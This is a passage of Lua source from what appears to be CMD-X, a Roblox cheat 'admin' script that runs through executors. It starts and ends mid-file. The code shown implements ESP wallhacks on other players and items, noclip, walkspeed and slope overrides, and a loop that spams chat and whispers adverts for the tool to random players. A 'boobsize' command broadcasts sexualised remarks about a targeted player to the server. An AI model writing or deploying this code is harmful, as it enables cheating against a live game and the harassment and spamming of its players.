						CreateCMDLabel(cmdloop2,i,aliases,v,usage)
					end
				end
			end)

			function refresh()
				local oldpos = cmdlp.Character.HumanoidRootPart.CFrame
				cmdlp.Character.Humanoid.Health = 0
				if cmdlp.Character:FindFirstChild("Head") then cmdlp.Character.Head:Destroy() end
				cmdlp.CharacterAdded:Wait()
				cmdlp.Character:WaitForChild("HumanoidRootPart")
				cmdlp.Character.HumanoidRootPart.CFrame = oldpos
			end

			function IESP(v)
				spawn(function()
					for i,n in pairs(cmdlp.PlayerGui:GetChildren()) do
						if n.Name == v:GetFullName()..'_IESP' then
							n:Destroy()
						end
					end
					wait()
					IESPholder = Instance.new("Folder", cmdlp.PlayerGui)
					IESPholder.Name = v:GetFullName()..'_IESP'
					local a = Instance.new("BoxHandleAdornment", IESPholder)
					a.Name = v.Name
					a.Adornee = v
					a.AlwaysOnTop = true
					a.ZIndex = 0
					a.Size = v.Size
					a.Transparency = 0.8
					a.Color = v.BrickColor
					local BillboardGui = Instance.new("BillboardGui", IESPholder)
					local TextLabel = Instance.new("TextLabel", getParent)
					BillboardGui.Adornee = v
					BillboardGui.Name = v.Name
					BillboardGui.Size = UDim2.new(0, 100, 0, 150)
					BillboardGui.StudsOffset = Vector3.new(0, 1, 0)
					BillboardGui.AlwaysOnTop = true
					TextLabel.Parent = BillboardGui
					TextLabel.BackgroundTransparency = 1
					TextLabel.Position = UDim2.new(0, 0, 0, -60)
					TextLabel.Size = UDim2.new(0, 100, 0, 100)
					TextLabel.Font = Enum.Font.SourceSansSemibold
					TextLabel.TextSize = 20
					TextLabel.TextColor3 = Color3.new(1, 1, 1)
					TextLabel.TextStrokeTransparency = 0.6
					TextLabel.TextYAlignment = Enum.TextYAlignment.Bottom
					TextLabel.Text = v.Name
				end)
			end

			workspace.DescendantAdded:Connect(function(i)
				if IESPenabled then
					local pi = i.Name:lower()
					local pt = "handle"
					local pt1 = "tool"
					local pt2 = "item"
					local z = string.find(pi,pt)
					local z1 = string.find(pi,pt1)
					local z2 = string.find(pi,pt2)
					if i:IsA("BasePart") and i.Parent.ClassName ~= "Accessory" then
						if z ~= nil or z1 ~= nil or z2 ~= nil then
							IESP(i)
						end
					end
				end
			end)

			workspace.DescendantRemoving:connect(function(i)
				if IESPenabled then
					for a,v in pairs(cmdlp.PlayerGui:GetChildren()) do
						if v.Name == i:GetFullName()..'_IESP' then
							v:Destroy()
						end
					end
				end
			end)

			function ESP(plr)
				spawn(function()
					for _,v in pairs(cmdlp.PlayerGui:GetChildren()) do
						if v.Name == plr.Name..'_ESP' then
							v:Destroy()
						end
					end
					wait()
					if plr.Character and plr.Name ~= cmdp.LocalPlayer.Name and not cmdp.LocalPlayer.PlayerGui:FindFirstChild(plr.Name..'_ESP') then
						local ESPholder = Instance.new("Folder", cmdlp.PlayerGui)
						ESPholder.Name = plr.Name..'_ESP'
						for b,n in pairs(plr.Character:GetChildren()) do
							if (n:IsA("BasePart")) then
								local a = Instance.new("BoxHandleAdornment", ESPholder)
								a.Name = plr.Name
								a.Adornee = n
								a.AlwaysOnTop = true
								a.ZIndex = 0
								a.Size = n.Size
								a.Transparency = 0.8
								for i,m in pairs(plr.Character:GetChildren()) do
									if m:IsA("Part") or m:IsA("MeshPart") then
										if m.Name ~= "HumanoidRootPart" and m.Name ~= "Handle" or (m:IsA("Part")) then
											m.Material = "ForceField"
											a.Color = m.BrickColor
										end
									end
								end
							end
						end
						if plr.Character and plr.Character:FindFirstChild('Head') then
							local BillboardGui = Instance.new("BillboardGui", ESPholder)
							local TextLabel = Instance.new("TextLabel", getParent)
							BillboardGui.Adornee = plr.Character.Head
							BillboardGui.Name = plr.Name
							BillboardGui.Size = UDim2.new(0, 100, 0, 150)
							BillboardGui.StudsOffset = Vector3.new(0, 1, 0)
							BillboardGui.AlwaysOnTop = true
							TextLabel.Parent = BillboardGui
							TextLabel.BackgroundTransparency = 1
							TextLabel.Position = UDim2.new(0, 0, 0, -60)
							TextLabel.Size = UDim2.new(0, 100, 0, 100)
							TextLabel.Font = Enum.Font.SourceSansSemibold
							TextLabel.TextSize = 20
							TextLabel.TextColor3 = Color3.new(1, 1, 1)
							TextLabel.TextStrokeTransparency = 0.6
							TextLabel.TextYAlignment = Enum.TextYAlignment.Bottom
							plr.CharacterAdded:Connect(function()
								if ESPenabled then
									espLoopFunc:Disconnect()
									ESPholder:Destroy()
									repeat wait(1) until plr.Character:FindFirstChild('HumanoidRootPart') and plr.Character:FindFirstChild('Humanoid')
							ESP(plr)
						end
					end)
					local function espLoop()
						if cmdlp.PlayerGui:FindFirstChild(plr.Name..'_ESP') then
							if plr.Character:FindFirstChild('HumanoidRootPart') and plr.Character:FindFirstChild('Humanoid') then
								TextLabel.Text = plr.Name.."|Studs: ".. math.floor((cmdlp.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude).."|Health: "..plr.Character.Humanoid.Health
							end
						else
							espLoopFunc:Disconnect()
						end
					end
					espLoopFunc = game:GetService("RunService").RenderStepped:Connect(espLoop)
				end
			end
		end)
	end

	cmdp.PlayerRemoving:connect(function(player)
		for _,v in pairs(cmdlp.PlayerGui:GetChildren()) do
			if v.Name == player.Name..'_ESP' or v.Name == player.Name..'_LC' then
				v:Destroy()
			end
		end
	end)

	if Noclipping then
		Noclipping:Disconnect()
	end
	Clip = true
	function noclip()
		Clip = false
		function NoclipLoop()
			if Clip == false and cmdlp.Character ~= nil then
				for _, child in pairs(cmdlp.Character:GetDescendants()) do
					if child:IsA("BasePart") and child.CanCollide == true then
						child.CanCollide = false
					end
				end
			end
		end
		Noclipping = game:GetService('RunService').Stepped:connect(NoclipLoop)
	end

	pcall(function()
		cmdlp.CharacterAdded:Connect(function()
			wait(1)
			if conFly then
				if FLYING then
					FLYING = false
					if cmdlp.Character.Humanoid then
						cmdlp.Character.Humanoid.PlatformStand = false 
					end
					sFLY()
					speedofthefly = permflyspeed
				end
			end
			if Clip == false then
				Clip = true
				wait()
				Clip = false
			end
		end)
	end)
	---------------------------------------|
	-- Commands: --------------------------|
	if cmdrs:FindFirstChild("DefaultChatSystemChatEvents") and cmdrs.DefaultChatSystemChatEvents:FindFirstChild("SayMessageRequest") then sayremote = cmdrs.DefaultChatSystemChatEvents.SayMessageRequest end
	function opx(f,text)
		if not ChatBind then
			output9.Text = output8.Text
			output8.Text = output7.Text
			output7.Text = output6.Text
			output6.Text = output5.Text
			output5.Text = output4.Text
			output4.Text = output3.Text
			output3.Text = output2.Text
			output2.Text = output1.Text
			if f == "*" then
				output1.Text = "[*] "..text
			elseif f == "-" then
				output1.Text = "[-] "..text
			end
		else
			if f == "*" then
				sayremote:FireServer("[CMD-X] [*] "..text, "All")
			elseif f == "-" then
				sayremote:FireServer("[CMD-X] [-] "..text, "All")
			end
		end
	end

	function alignFunctions(getArgs)
		arguments = string.split(getArgs," ")
		function getstring(begin)
			local start = begin-1
			local AA = ''
			for i,v in pairs(arguments) do
				if i > start then
					if AA ~= '' then
						AA = AA .. ' ' .. v
					else
						AA = AA .. v
					end
				end
			end
			return AA
		end
		arguments[1] = arguments[1]:lower()
	end

	function findCmd(cmd_name)
		if CMDS.commands[cmd_name:lower()] then
			return cmd_name:lower()
		elseif CMDS.aliases[cmd_name:lower()] then
			return CMDS.aliases[cmd_name:lower()]
		else
			return nil
		end
	end

	local noCMD = false

	function HDAdminCheck()
		if cmdrs:FindFirstChild("HDAdminClient") then
			for i,v in pairs(cmdrs.HDAdminClient.Signals.RetrieveServerRanks:InvokeServer()) do
				if v.Player == cmdlp then
					return true
				end
			end
		end
		return false
	end

	HDBanString = {["itle"] = "", [""] = ""}
	CMDS.hd = {}

	function CheckHDList(str)
		for i,v in pairs(CMDS.hd) do
			if v == str then
				return true
			end
		end
		return false
	end

	fixedArgs = false
	Debugging = false
	local History = {}

	getgenv().useCommand = {}
	getgenv().arguments = {}

	function executeCommand(com)
		wait(.1)
		if com:lower():sub(1,#prefix) == prefix then
			com = com:sub(#prefix+1,#com)
		elseif com:lower():sub(1,1) == '.' then
			com = com:sub(2,#com)
		end
		if com ~= "" then
			local matchCommand = ""
			alignFunctions(com)
			local cmdsy = findCmd(arguments[1])
			if cmdsy then
				History[#History+1] = com
				updatesaves()
				if fixedArgs == false then
					if commandsLoaded() and noCMD == false then
						if Debugging == false then
							useCommand[cmdsy]()
						else
							pcall(function() useCommand[cmdsy]() end)
						end
					elseif noCMD == true and cmdsy == "yescommands" then
						useCommand[cmdsy]()
					else
						opx("*","Need help? Join our discord! "..cordCode)
					end
				else
					opx("*","Need help? Join our discord! "..cordCode)
				end
			else
				local invalidString = getstring(1)
				if #invalidString > 38 then
					invalidString = invalidString:sub(1,35).."..."
				end
				opx("*",invalidString.." is not a valid command.")
			end
		end    
	end

	cmd.FocusLost:connect(function()
		local comsToExe = cmd.Text:split(";;")
		cmd.Text = ""
		for i,v in pairs(comsToExe) do
			executeCommand(v)
		end
	end)

	function useCommand.prefix()
		opx("-","Your prefix is "..prefix.." or .")
	end

	function useCommand.promptnew()
		if arguments[2] == "name" then
			prompt = cmdlp.Name.." >"
			updatesaves()
			user.Text = cmdlp.Name.." >"
			opx("-","Prompt name set to username")
		else
			prompt = getstring(2).." >"
			updatesaves()
			user.Text = getstring(2).." >"
			opx("-","Prompt name set to "..getstring(2))
		end
	end

	function useCommand.prefixnew()
		if arguments[2] then
			prefix = arguments[2]
			updatesaves()
			opx("-","Prefix set to "..arguments[2])
		else
			opx("*","2 arguments are required for this command!")
		end
	end

	function useCommand.boobsize()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				local BBtable = {"Baby size","Tiny","Medium size","Normal Size","Large","Gigantic","Anime size"}
				math.randomseed(target.UserId + 20)
				local pickBB = math.random(1,#BBtable)
				opx("-",target.Name.." has "..BBtable[pickBB].." roboobs")
				sayremote:FireServer(target.Name.." has "..BBtable[pickBB].." roboobs","All")
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are required for this command!")
		end
	end

	function useCommand.hotkeyopen()
		if arguments[2] then
			hotkeyopen = arguments[2]:lower()
			updatesaves()
			opx("-","Hotkey set to "..arguments[2])
		else
			opx("*","2 arguments are required for this command!")
		end
	end


	function useCommand.hotkeyfocus()
		if arguments[2] then
			hotkeyfocus = arguments[2]:lower()
			updatesaves()
			opx("-","Hotkey set to "..arguments[2])
		else
			opx("*","2 arguments are required for this command!")
		end
	end

	ManageHolderEnter = Instance.new("Frame", getParent)
	MangeScrollEnter = Instance.new("ScrollingFrame", getParent)
	BtnAddEnter = Instance.new("TextButton", getParent)
	BtnClearEnter = Instance.new("TextButton", getParent)
	ManageTitleEnter = Instance.new("TextLabel", getParent)
	SlideOutEnter = Instance.new("Frame", getParent)
	Edit1Enter = Instance.new("TextBox", getParent)
	Edit2Enter = Instance.new("TextBox", getParent)
	Edit3Enter = Instance.new("TextBox", getParent)
	TitleSlideEnter = Instance.new("TextLabel", getParent)
	CancelBtnEnter = Instance.new("TextButton", getParent)
	ApplyBtnEnter = Instance.new("TextButton", getParent)
	BtnExitEnter = Instance.new("TextButton", getParent)

	ManageHolderEnter.Name = "ManageHolderEnter"
	ManageHolderEnter.Parent = Unnamed
	ManageHolderEnter.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
	ManageHolderEnter.BackgroundTransparency = -0.010
	ManageHolderEnter.BorderSizePixel = 0
	ManageHolderEnter.Position = UDim2.new(0.33610791, 0, 0.279678553, 0)
	ManageHolderEnter.Size = UDim2.new(0, 424, 0, 294)
	ManageHolderEnter.Active = true
	createDrag(ManageHolderEnter)
	ManageHolderEnter.Visible = false

	MangeScrollEnter.Name = "MangeScrollEnter"
	MangeScrollEnter.Parent = ManageHolderEnter
	MangeScrollEnter.BackgroundColor3 = Color3.fromRGB(58, 58, 58)
	MangeScrollEnter.BorderSizePixel = 0
	MangeScrollEnter.Position = UDim2.new(0.0268278271, 0, 0.10493198, 0)
	MangeScrollEnter.Size = UDim2.new(0, 401, 0, 214)

	function Template2(name,entry)
		local TemplateFrame = Instance.new("Frame", getParent)
		local TemplateName = Instance.new("TextLabel", getParent)
		local TemplateBtnRemove = Instance.new("TextButton", getParent)
		local TemplateBtnAdd = Instance.new("TextButton", getParent)
		local alls2 = 5
		for _,v in pairs(MangeScrollEnter:GetChildren()) do
			if v then
				alls2 = v.Size.Y.Offset + alls2+5
			end
			if not v then
				alls2 = 5
			end
		end
		TemplateFrame.Name = name
		TemplateFrame.Parent = MangeScrollEnter
		TemplateFrame.BackgroundColor3 = Color3.fromRGB(77, 77, 77)
		TemplateFrame.BorderSizePixel = 0
		TemplateFrame.Position = UDim2.new(-1,0,0,alls2)
		TemplateFrame.Size = UDim2.new(0, 368, 0, 19)

		TemplateName.Name = "TemplateName"
		TemplateName.Parent = TemplateFrame
		TemplateName.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		TemplateName.BackgroundTransparency = 1.000
		TemplateName.BorderSizePixel = 0
		TemplateName.Position = UDim2.new(0.0231884252, 0, 0, 0)
		TemplateName.Size = UDim2.new(0, 191, 0, 19)
		TemplateName.Font = Enum.Font.GothamBlack
		TemplateName.Text = name.."|"..entry
		TemplateName.TextColor3 = Color3.fromRGB(255, 255, 255)
		TemplateName.TextSize = 14.000
		TemplateName.TextXAlignment = Enum.TextXAlignment.Left

		TemplateBtnRemove.Name = "TemplateBtnRemove"
		TemplateBtnRemove.Parent = TemplateFrame
		TemplateBtnRemove.BackgroundColor3 = Color3.fromRGB(176, 176, 176)
		TemplateBtnRemove.BackgroundTransparency = 0.700
		TemplateBtnRemove.BorderSizePixel = 0
		TemplateBtnRemove.Position = UDim2.new(0.859420359, 0, 0, 0)
		TemplateBtnRemove.Size = UDim2.new(0, 51, 0, 19)
		TemplateBtnRemove.Font = Enum.Font.Gotham
		TemplateBtnRemove.Text = "Remove"
		TemplateBtnRemove.TextColor3 = Color3.fromRGB(255, 255, 255)
		TemplateBtnRemove.TextSize = 12.000
		TemplateBtnRemove.MouseButton1Down:Connect(function()
			table.remove(enterCMD,entry)
			TemplateBtnRemove.Parent:Destroy()
			updatesaves()
		end)

		TemplateBtnAdd.Name = "TemplateBtnAdd"
		TemplateBtnAdd.Parent = TemplateFrame
		TemplateBtnAdd.BackgroundColor3 = Color3.fromRGB(176, 176, 176)
		TemplateBtnAdd.BackgroundTransparency = 0.700
		TemplateBtnAdd.BorderSizePixel = 0
		TemplateBtnAdd.Position = UDim2.new(0.699094296, 0, 0, 0)
		TemplateBtnAdd.Size = UDim2.new(0, 51, 0, 19)
		TemplateBtnAdd.Font = Enum.Font.Gotham
		TemplateBtnAdd.Text = "Edit"
		TemplateBtnAdd.TextColor3 = Color3.fromRGB(255, 255, 255)
		TemplateBtnAdd.TextSize = 12.000
		TemplateBtnAdd.MouseButton1Down:Connect(function()
			SlideOutEnter.Visible = true
			SlideOutEnter:TweenSize(UDim2.new(0, 215, 0, 294), 'In', 'Quint', 0.5)
			CurrentEdit = entry
			TitleSlideEnter.Text = enterCMD[entry].N
			updatesaves()
		end)

		TemplateFrame:TweenPosition(UDim2.new(0,3,0,alls2), 'In', 'Quint', 0.5)
	end

	BtnAddEnter.Name = "BtnAddEnter"
	BtnAddEnter.Parent = ManageHolderEnter
	BtnAddEnter.BackgroundColor3 = Color3.fromRGB(58, 58, 58)
	BtnAddEnter.BorderSizePixel = 0
	BtnAddEnter.Position = UDim2.new(0.026827829, 0, 0.864668369, 0)
	BtnAddEnter.Size = UDim2.new(0, 85, 0, 33)
	BtnAddEnter.Font = Enum.Font.Gotham
	BtnAddEnter.Text = "Add"
	BtnAddEnter.TextColor3 = Color3.fromRGB(255, 255, 255)
	BtnAddEnter.TextSize = 14.000
	BtnAddEnter.MouseButton1Down:Connect(function()
		SlideOutEnter.Visible = true
		SlideOutEnter:TweenSize(UDim2.new(0, 215, 0, 294), 'In', 'Quint', 0.5)
		enterCMD[#enterCMD+1] = {N = "Unnamed"}
		CurrentEdit = #enterCMD
		TitleSlideEnter.Text = enterCMD[#enterCMD].N
		Template2(enterCMD[#enterCMD].N,#enterCMD)
		updatesaves()
	end)

	BtnClearEnter.Name = "BtnClearEnter"
	BtnClearEnter.Parent = ManageHolderEnter
	BtnClearEnter.BackgroundColor3 = Color3.fromRGB(58, 58, 58)
	BtnClearEnter.BorderSizePixel = 0
	BtnClearEnter.Position = UDim2.new(0.244457483, 0, 0.864668369, 0)
	BtnClearEnter.Size = UDim2.new(0, 85, 0, 33)
	BtnClearEnter.Font = Enum.Font.Gotham
	BtnClearEnter.Text = "Clear"
	BtnClearEnter.TextColor3 = Color3.fromRGB(255, 255, 255)
	BtnClearEnter.TextSize = 14.000
	BtnClearEnter.MouseButton1Down:Connect(function()
		MangeScrollEnter:ClearAllChildren()
		enterCMD = {}
		Edit1Enter.Text = ""
		Edit2Enter.Text = ""
		Edit3Enter.Text = ""
		SlideOutEnter.Visible = false
		SlideOutEnter:TweenSize(UDim2.new(0, 0, 0, 294), 'Out', 'Quint', 0.5)
		CurrentEdit = ""
		updatesaves()
	end)

	ManageTitleEnter.Name = "ManageTitleEnter"
	ManageTitleEnter.Parent = ManageHolderEnter
	ManageTitleEnter.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	ManageTitleEnter.BackgroundTransparency = 1.000
	ManageTitleEnter.Position = UDim2.new(0.263266504, 0, 0.00765306223, 0)
	ManageTitleEnter.Size = UDim2.new(0, 200, 0, 32)
	ManageTitleEnter.Font = Enum.Font.GothamSemibold
	ManageTitleEnter.Text = "CMD-X EnterCMDs MANAGER"
	ManageTitleEnter.TextColor3 = Color3.fromRGB(255, 255, 255)
	ManageTitleEnter.TextSize = 14.000

	SlideOutEnter.Name = "SlideOutEnter"
	SlideOutEnter.Parent = ManageHolderEnter
	SlideOutEnter.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	SlideOutEnter.BackgroundTransparency = 0.500
	SlideOutEnter.BorderSizePixel = 0
	SlideOutEnter.Position = UDim2.new(-0.507332683, 0, 0, 0)
	SlideOutEnter.Size = UDim2.new(0, 0, 0, 294)
	SlideOutEnter.Visible = false

	Edit1Enter.Name = "Edit1Enter"
	Edit1Enter.Parent = SlideOutEnter
	Edit1Enter.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
	Edit1Enter.BorderSizePixel = 0
	Edit1Enter.Position = UDim2.new(0.0325581394, 0, 0.0850340128, 0)
	Edit1Enter.Size = UDim2.new(0, 200, 0, 26)
	Edit1Enter.Font = Enum.Font.Gotham
	Edit1Enter.PlaceholderColor3 = Color3.fromRGB(230, 230, 230)
	Edit1Enter.PlaceholderText = "Enter command here"
	Edit1Enter.Text = ""
	Edit1Enter.TextColor3 = Color3.fromRGB(255, 255, 255)
	Edit1Enter.TextSize = 14.000

	Edit2Enter.Name = "Edit2Enter"
	Edit2Enter.Parent = SlideOutEnter
	Edit2Enter.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
	Edit2Enter.BorderSizePixel = 0
	Edit2Enter.Position = UDim2.new(0.0325581394, 0, 0.204081625, 0)
	Edit2Enter.Size = UDim2.new(0, 200, 0, 26)
	Edit2Enter.Font = Enum.Font.Gotham
	Edit2Enter.PlaceholderColor3 = Color3.fromRGB(230, 230, 230)
	Edit2Enter.PlaceholderText = "Enter ... here"
	Edit2Enter.Text = ""
	Edit2Enter.TextColor3 = Color3.fromRGB(255, 255, 255)
	Edit2Enter.TextSize = 14.000

	Edit3Enter.Name = "Edit3Enter"
	Edit3Enter.Parent = SlideOutEnter
	Edit3Enter.BackgroundColor3 = Color3.fromRGB(71, 71, 71)
	Edit3Enter.BorderSizePixel = 0
	Edit3Enter.Position = UDim2.new(0.0325581394, 0, 0.31292516, 0)
	Edit3Enter.Size = UDim2.new(0, 200, 0, 26)
	Edit3Enter.Font = Enum.Font.Gotham
	Edit3Enter.PlaceholderColor3 = Color3.fromRGB(230, 230, 230)
	Edit3Enter.PlaceholderText = "Enter ... here"
	Edit3Enter.Text = ""
	Edit3Enter.TextColor3 = Color3.fromRGB(255, 255, 255)
	Edit3Enter.TextSize = 14.000

	TitleSlideEnter.Name = "TitleSlideEnter"
	TitleSlideEnter.Parent = SlideOutEnter
	TitleSlideEnter.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	TitleSlideEnter.BackgroundTransparency = 1.000
	TitleSlideEnter.Position = UDim2.new(0.0307083577, 0, -0.0161564611, 0)
	TitleSlideEnter.Size = UDim2.new(0, 200, 0, 32)
	TitleSlideEnter.Font = Enum.Font.GothamSemibold
	TitleSlideEnter.Text = "..."
	TitleSlideEnter.TextColor3 = Color3.fromRGB(255, 255, 255)
	TitleSlideEnter.TextSize = 14.000

	CancelBtnEnter.Name = "CancelBtnEnter"
	CancelBtnEnter.Parent = SlideOutEnter
	CancelBtnEnter.BackgroundColor3 = Color3.fromRGB(58, 58, 58)
	CancelBtnEnter.BorderSizePixel = 0
	CancelBtnEnter.Position = UDim2.new(0.561230242, 0, 0.442899674, 0)
	CancelBtnEnter.Size = UDim2.new(0, 85, 0, 33)
	CancelBtnEnter.Font = Enum.Font.Gotham
	CancelBtnEnter.Text = "Cancel"
	CancelBtnEnter.TextColor3 = Color3.fromRGB(255, 255, 255)
	CancelBtnEnter.TextSize = 14.000
	CancelBtnEnter.MouseButton1Down:Connect(function()
		Edit1Enter.Text = ""
		Edit2Enter.Text = ""
		Edit3Enter.Text = ""
		SlideOutEnter.Visible = false
		SlideOutEnter:TweenSize(UDim2.new(0, 0, 0, 294), 'Out', 'Quint', 0.5)
		CurrentEdit = ""
	end)

	function MakeChanges(title,new)
		for _,v in pairs(MangeScrollEnter:GetChildren()) do
			if v.Name == title then
				v.Name = new
				xText = v.TemplateName.Text:split("|")
				v.TemplateName.Text = new.."|"..xText[2]
			end
		end
	end

	ApplyBtnEnter.Name = "ApplyBtnEnter"
	ApplyBtnEnter.Parent = SlideOutEnter
	ApplyBtnEnter.BackgroundColor3 = Color3.fromRGB(58, 58, 58)
	ApplyBtnEnter.BorderSizePixel = 0
	ApplyBtnEnter.Position = UDim2.new(0.0318313837, 0, 0.442899674, 0)
	ApplyBtnEnter.Size = UDim2.new(0, 85, 0, 33)
	ApplyBtnEnter.Font = Enum.Font.Gotham
	ApplyBtnEnter.Text = "Apply"
	ApplyBtnEnter.TextColor3 = Color3.fromRGB(255, 255, 255)
	ApplyBtnEnter.TextSize = 14.000
	ApplyBtnEnter.MouseButton1Down:Connect(function()
		enterCMD[CurrentEdit] = {N = Edit1Enter.Text}
		MakeChanges(TitleSlideEnter.Text,Edit1Enter.Text)
		Edit1Enter.Text = ""
		Edit2Enter.Text = ""
		Edit3Enter.Text = ""
		SlideOutEnter.Visible = false
		SlideOutEnter:TweenSize(UDim2.new(0, 0, 0, 294), 'Out', 'Quint', 0.5)
		CurrentEdit = ""
		updatesaves()
	end)

	BtnExitEnter.Name = "BtnExitEnter"
	BtnExitEnter.Parent = ManageHolderEnter
	BtnExitEnter.BackgroundColor3 = Color3.fromRGB(58, 58, 58)
	BtnExitEnter.BackgroundTransparency = 1.000
	BtnExitEnter.BorderSizePixel = 0
	BtnExitEnter.Position = UDim2.new(0.950231194, 0, -0.00778063387, 0)
	BtnExitEnter.Size = UDim2.new(0, 28, 0, 26)
	BtnExitEnter.Font = Enum.Font.GothamBold
	BtnExitEnter.Text = "X"
	BtnExitEnter.TextColor3 = Color3.fromRGB(255, 255, 255)
	BtnExitEnter.TextSize = 14.000
	BtnExitEnter.MouseButton1Down:Connect(function()
		for i,_ in pairs(enterCMD) do
			if _.N == "Unnamed" then
				table.remove(enterCMD, i)
			end
		end
		ManageHolderEnter.Visible = false
		Edit1Enter.Text = ""
		Edit2Enter.Text = ""
		Edit3Enter.Text = ""
		SlideOutEnter.Visible = false
		SlideOutEnter:TweenSize(UDim2.new(0, 0, 0, 294), 'Out', 'Quint', 0.5)
		CurrentEdit = ""
		updatesaves()
	end)

	function useCommand.entercmdnew()
		if arguments[2] then
			enterCMD[#enterCMD+1] = {N = getstring(2)}
			updatesaves()
			opx("-","Added "..getstring(2).." to enter cmds")
		else
			opx("*","2 arguments are required for this command!")
		end
	end

	function useCommand.entercmds()
		opx("-","Opened enter cmd manager")
		MangeScrollEnter:ClearAllChildren()
		ManageHolderEnter.Visible = true
		for i,_ in pairs(enterCMD) do
			Template2(enterCMD[i].N,i)
		end
	end

	function useCommand.listentercmds()
		if #enterCMD ~= 0 then
			xECMD = #enterCMD.." | "
			for i = 1,#enterCMD do
				xEMD = xECMD..enterCMD[i].N..", "
			end
			opx("-","Listed enter cmds")
			opxL("Enter Commands",xECMD)
		else
			opx("*","You have no enter cmds!")
		end
	end

	function useCommand.entercmddel()
		if arguments[2] then
			if #enterCMD ~= 0 then
				for i = 1,#enterCMD do
					if enterCMD[i].N == getstring(2) then
						table.remove(enterCMD, i)
						updatesaves()
					end
				end
				opx("Removed "..getstring(2).." from enter cmds")
			else
				opx("*","You have no enter cmds!")
			end
		else
			opx("*","2 arguments are required for this command!")
		end
	end

	function useCommand.entercmdsclr()
		if #enterCMD ~= 0 then
			enterCMD = {}
			updatesaves()
			opx("-","Cleared all enter cmds")
		else
			opx("*","You have no enter cmds!")
		end
	end

	function useCommand.eightballpu()
		local eightball = {"Maybe","Possibly","No","Yes","Never","Don't get your hopes up","100%","0%","50%","Likely","Extremely Likely","Almost Certain","Impossible","Possible","Currently... no","Maybe later on in life","Aha... Good luck on that one","This will definently happen buddy","Stop asking me questions","Hmm..."}
		local value = math.random(1,#eightball)
		local picked_value = eightball[value]
		sayremote:FireServer("8Ball says: "..tostring(picked_value), "All")
		opx("8Ball says: "..tostring(picked_value))
	end

	function useCommand.eightballpr()
		local eightball = {"Maybe","Possibly","No","Yes","Never","Don't get your hopes up","100%","0%","50%","Likely","Extremely Likely","Almost Certain","Impossible","Possible","Currently... no","Maybe later on in life","Aha... Good luck on that one","This will definently happen buddy","Stop asking me questions","Hmm..."}
		local value = math.random(1,#eightball)
		local picked_value = eightball[value]
		opx("8Ball says: "..tostring(picked_value))
	end

	function useCommand.pi()
		opx("-","Pi is "..math.pi)
	end

	local helpCode = cordCode
	function useCommand.support()
		if arguments[2] == "cb" or arguments[2] == "copy" then
			setclipboard(helpCode)
		end
		opx("-","The link for support is "..helpCode)
	end

	function useCommand.commands()
		Scrollingcmdi:ClearAllChildren()
		cmdsholder.Visible = true
		local cmdloop1 = 0
		local cmdloop2 = 0
		for i,v in pairs(CMDS.commands) do
			local aliases = ""
			cmdloop2 = cmdloop2 + 1
			for o,b in pairs(CMDS.aliases) do
				if i == b then
					cmdloop1 = cmdloop1 + 1
					aliases = aliases..o..", "
					if cmdloop1%200 == 0 then
						game:GetService("RunService").RenderStepped:Wait()
					end
				end
			end
			aliases = aliases:sub(1,#aliases-2)
			local usage = ""
			if CMDS.usage[i] then
				usage = CMDS.usage[i]
			end
			CreateCMDLabel(cmdloop2,i,aliases,v,usage)
		end
		opx("-","CMDS Loaded")
	end
	function useCommand.config()
		configframe.Visible = true
		configframe:TweenSize(UDim2.new(0,300,0,433), Enum.EasingDirection.In, Enum.EasingStyle.Quad, .5)
		opx("-","Config loaded")
	end

	local cmdAdvertise = false
	function useCommand.advertise()
		cmdAdvertise = true
		while cmdAdvertise do
			local str = "Get CMD X today! Best admin GUI, supports paid executors! type in cmd-x on google!"
			sayremote:FireServer(str, "All")
			wait(math.random(1, 6)) 
			local randomPlayer = cmdp:GetPlayers()[math.random(2,#cmdp:GetPlayers())]
			cmdlp.Character.Humanoid:MoveTo(randomPlayer.Character.HumanoidRootPart.Position)
			sayremote:FireServer(str, "All")
			wait(math.random(1, 6))
			local randomPlayer = cmdp:GetPlayers()[math.random(2,#cmdp:GetPlayers())]
			sayremote:FireServer("/w "..randomPlayer.Name.." "..str, "All")
			local randomPlayer = cmdp:GetPlayers()[math.random(2,#cmdp:GetPlayers())]
			sayremote:FireServer("/w "..randomPlayer.Name.." "..str, "All")
			local randomPlayer = cmdp:GetPlayers()[math.random(2,#cmdp:GetPlayers())]
			sayremote:FireServer("/w "..randomPlayer.Name.." "..str, "All")
			local randomPlayer = cmdp:GetPlayers()[math.random(2,#cmdp:GetPlayers())]
			sayremote:FireServer("/w "..randomPlayer.Name.." "..str, "All")
			local randomPlayer = cmdp:GetPlayers()[math.random(2,#cmdp:GetPlayers())]
			sayremote:FireServer(str, "All")
			wait(math.random(1, 6))
			local randomPlayer = cmdp:GetPlayers()[math.random(2,#cmdp:GetPlayers())]
			cmdlp.Character.Humanoid:MoveTo(randomPlayer.Character.HumanoidRootPart.Position)
		end
		opx("-","Now advertising CMD-X (Thank you!)")
	end

	function useCommand.unadvertise()
		cmdAdvertise = false
		opx("-","Stopped advertising CMD-X (Thank you!)")
	end

	function useCommand.version()
		opx("-","CMD-X is currently on "..ver)
	end

	function useCommand.maxslopeangle()
		if arguments[2] and cmdnum(arguments[2]) then
			cmdlp.Character.Humanoid.MaxSlopeAngle = arguments[2]
			opx("-","MaxSlopeAngle set to "..arguments[2])
		else
			cmdlp.Character.Humanoid.MaxSlopeAngle = permmaxsl
			opx("-","MaxSlopeAngle set to "..permmaxsl)
		end
	end

	function useCommand.defaultmaxslopeangle()
		cmdlp.Character.Humanoid.MaxSlopeAngle = 89
		opx("-","MaxSlopeAngle set to default (89)")
	end

	function useCommand.walkspeed()
		if arguments[2] and cmdnum(arguments[2]) then
			cmdlp.Character.Humanoid.WalkSpeed = arguments[2]
			opx("-","Walkspeed set to "..arguments[2])
		else
			cmdlp.Character.Humanoid.WalkSpeed = permwalkspeed
			opx("-","Walkspeed set to "..permwalkspeed)
		end
	end

	function useCommand.defaultwalkspeed()
		cmdlp.Character.Humanoid.WalkSpeed = 16
		opx("-","Walkspeed set to default (16)")
	end

